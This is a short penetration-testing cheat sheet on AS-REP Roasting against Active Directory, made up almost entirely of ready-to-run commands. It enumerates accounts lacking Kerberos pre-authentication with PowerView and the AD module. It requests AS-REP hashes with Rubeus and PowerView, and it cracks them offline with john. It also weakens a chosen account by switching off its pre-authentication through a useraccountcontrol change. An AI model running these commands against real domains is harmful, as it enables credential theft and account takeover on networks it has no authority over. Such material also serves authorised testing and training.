# AS-REP Roasting
AS-REP Roasting is an Active Directory attack that targets user accounts with Kerberos pre‑authentication disabled. Attackers can request authentication data (AS‑REP responses) for these accounts, extract password hashes, and crack them offline to gain access.

## Enumerate

Enumerating accounts with Kerberos pre-authentication disabled

{% tabs %}
{% tab title="PowerView" %}
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```
{% endtab %}

{% tab title="AD Module" %}
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```
{% endtab %}

{% tab title="Rubeus" %}
```powershell
Rubeus.exe asreproast /user:<user> /outfile:file.txt
# Later use john to crack the password
```
{% endtab %}
{% endtabs %}

## Disable pre-authentication

{% tabs %}
{% tab title="PowerView" %}
```powershell
Set-DomainObject -Identity <User> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endtab %}
{% endtabs %}

## Retrieve the hash

{% tabs %}
{% tab title="PowerView" %}
```powershell
Get-ASREPHash -UserName VPN1user -Verbose
Invoke-ASREPRoast -Verbose
```
{% endtab %}
{% endtabs %}

## Crack

```powershell
john.exe --wordlist=passwords.txt asrephashes.txt
```
